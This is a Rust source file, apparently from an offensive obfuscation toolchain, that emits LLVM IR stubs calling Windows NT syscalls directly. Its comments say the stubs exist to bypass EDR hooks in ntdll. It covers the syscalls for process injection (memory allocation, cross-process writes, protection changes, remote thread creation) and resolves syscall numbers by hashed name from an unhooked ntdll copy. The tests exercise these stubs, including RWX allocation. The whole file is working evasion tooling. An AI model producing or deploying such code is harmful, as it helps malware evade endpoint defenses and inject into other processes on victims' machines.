/// Direct NT syscall stub emitter.
///
/// Emits LLVM IR that calls Windows NT syscalls by number rather than through
/// ntdll.dll.  EDR user-mode hooks sit in ntdll — calling the kernel directly
/// via `syscall`/`int 2Eh` bypasses them entirely.
///
/// Syscall numbers (SSNs) vary between Windows versions.  We emit a runtime
/// resolver that reads the SSN from the **fresh** ntdll mapping done by
/// `NtdllUnhooker` instead of hard-coding them, so the binary works across
/// Windows 10/11 builds.

/// Known NT syscall names and their approximate SSN on Win10 21H2.
/// Used only for documentation/reference — actual SSNs come from the
/// fresh ntdll mapping at runtime.
pub const KNOWN_SYSCALLS: &[(&str, u32)] = &[
    ("NtAllocateVirtualMemory", 0x0018),
    ("NtWriteVirtualMemory",    0x003A),
    ("NtProtectVirtualMemory",  0x0050),
    ("NtCreateThreadEx",        0x00C2),
    ("NtOpenProcess",           0x0026),
    ("NtQuerySystemInformation",0x0036),
    ("NtReadVirtualMemory",     0x003F),
    ("NtClose",                 0x000F),
];

pub struct DirectSyscall {
    name: String,
    /// IR variable holding the resolved SSN at runtime
    ssn_var: String,
}

impl DirectSyscall {
    pub fn new(syscall_name: &str, ssn_var: &str) -> Self {
        Self {
            name: syscall_name.to_string(),
            ssn_var: ssn_var.to_string(),
        }
    }

    /// Emit LLVM IR for a direct syscall stub.
    ///
    /// The emitted IR calls `@jocky_direct_syscall(i32 %ssn, ...)`  which is
    /// a runtime function that moves the SSN into EAX and executes `syscall`.
    /// On Windows ≥ 8 the kernel uses the `syscall` instruction; the runtime
    /// helper handles both `syscall` and `int 0x2e` for compatibility.
    pub fn emit_ir(&self, args_ir: &str) -> String {
        format!(
r#"  ; direct syscall: {name} (ssn in {ssn})
  %sc_ret_{name} = call i64 @jocky_direct_syscall(
    i32 {ssn},
    {args}
  )"#,
            name = self.name.replace("Nt", "nt_"),
            ssn  = self.ssn_var,
            args = args_ir,
        )
    }

    /// Emit IR to resolve the SSN at runtime by walking the fresh ntdll copy.
    pub fn emit_ssn_resolver(&self) -> String {
        let hash = crate::obfuscator::iat_masker::hash_api_name(&self.name, 3);
        format!(
r#"  ; resolve SSN for {name} via fresh ntdll walk
  %ssn_hash_{name} = add i64 0, {hash}
  {ssn} = call i32 @jocky_resolve_ssn(i64 %ssn_hash_{name})"#,
            name = self.name,
            hash = hash,
            ssn  = self.ssn_var,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_emit_ir_contains_direct_syscall_helper() {
        let sc = DirectSyscall::new("NtAllocateVirtualMemory", "%ssn_alloc");
        let ir = sc.emit_ir("i64 %proc, i64* %base, i64 0, i64* %size, i32 0x3000, i32 0x40");
        assert!(ir.contains("jocky_direct_syscall"), "must call helper");
    }

    #[test]
    fn test_emit_ssn_resolver_contains_name() {
        let sc = DirectSyscall::new("NtCreateThreadEx", "%ssn_thread");
        let r  = sc.emit_ssn_resolver();
        assert!(r.contains("NtCreateThreadEx"), "must reference syscall name");
        assert!(r.contains("jocky_resolve_ssn"), "must call SSN resolver");
    }

    #[test]
    fn test_known_syscalls_table_nonempty() {
        assert!(!KNOWN_SYSCALLS.is_empty());
    }
}
